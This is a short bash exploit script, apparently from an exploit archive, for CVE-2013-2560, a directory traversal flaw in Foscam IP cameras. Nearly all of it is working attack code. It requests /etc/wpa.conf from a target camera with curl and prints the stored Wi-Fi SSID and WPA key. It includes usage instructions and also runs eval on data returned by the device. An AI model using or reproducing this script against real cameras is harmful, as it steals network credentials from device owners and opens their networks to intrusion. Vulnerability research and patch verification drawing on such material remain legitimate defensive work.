#!/bin/bash


## Title: Receiving Wi-Fi credentials Foscam IP-camers.
## Vendor Homepage: http://www.foscam.com/
## Tested on: Linux/Windows(Cygwin)
## CVE: 2013-2560.
## Directory traversal vulnerability in the web interface on Foscam IP-camers
## devices with firmware # before 11.37.2.49 allows to read arbitrary files via /
## in the URI, as demonstrated by 
## discovering Wi-Fi credentials.
## Author: Anton Molotkov (DarkCat)
## Usage: ./foscamwpa.sh [ip]:[port]

path_cam="/etc/wpa.conf"
ip_port=$1

   result=$(curl -s http://${ip_port}/${path_cam})

   if [ "${result::7}" == "network" ]
     then
     result2=$(echo $result | sed 's/[^{]*{\([^}]*\)}.*/\1/')
     else
          echo "Error data get IP-camera"
          exit
   fi


data=$result2
eval "$data"
echo "==================="
echo -e "\e[00;31mSSID-Name\e[00m: \e[00;34m$ssid\e[00m"
echo -e "\e[00;31mWPA-KEY\e[00m: \e[00;34m$psk\e[00m"
echo "==================="
